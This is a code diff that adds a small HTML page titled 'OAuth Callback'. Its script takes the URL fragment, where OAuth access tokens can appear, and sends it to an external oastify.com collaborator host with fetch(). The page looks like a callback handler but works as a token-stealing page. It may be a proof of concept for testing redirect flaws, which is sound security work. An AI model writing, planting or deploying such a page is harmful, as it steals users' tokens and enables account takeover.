@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>OAuth Callback</title>
+</head>
+<body>
+<script>
+  if (window.location.hash) {
+    fetch(
+      "https://xpqyjjcmcr2vpi3wn8hlosl0rrxil99y.oastify.com/?" +
+      encodeURIComponent(window.location.hash)
+    );
+  }
+</script>
+</body>
+</html>
